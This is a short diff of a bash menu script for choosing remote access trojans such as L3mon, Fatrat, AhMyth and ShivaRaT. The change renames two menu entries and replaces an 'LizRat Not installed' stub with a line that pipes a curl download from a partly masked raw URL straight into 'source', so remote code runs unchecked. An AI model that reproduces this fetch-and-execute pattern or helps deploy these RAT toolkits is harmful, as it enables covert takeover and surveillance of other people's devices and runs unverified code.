@@ -11,8 +11,8 @@ White='\033[0;37m'
 ratchech()
 {
 echo -e "
- ${Green} 1.${Yellow} Lemon
- ${Green} 2.${Yellow} LizRat
+ ${Green} 1.${Yellow} L3mon
+ ${Green} 2.${Yellow} L3MON-static
  ${Green} 3.${Yellow} Fatrat
  ${Green} 4.${Yellow} Ahmyth
  ${Green} 5.${Yellow} ShivaRaT
@@ -34,12 +34,10 @@ echo
   
 2)
 echo
-  echo -e "${Green} Your pressed LizRat${clean}"
+  echo -e "${Green} Your pressed L3MON-static${clean}"
   sleep 1
-  echo -e "${Green} Checking...${clean}"
-  sleep 3
-    echo -e "${Green} LizRat Not installed${clean}"
-    echo;;
+source <(curl -fsSL https://raw.************************link.sh)
+echo;;
   
 3)
 echo
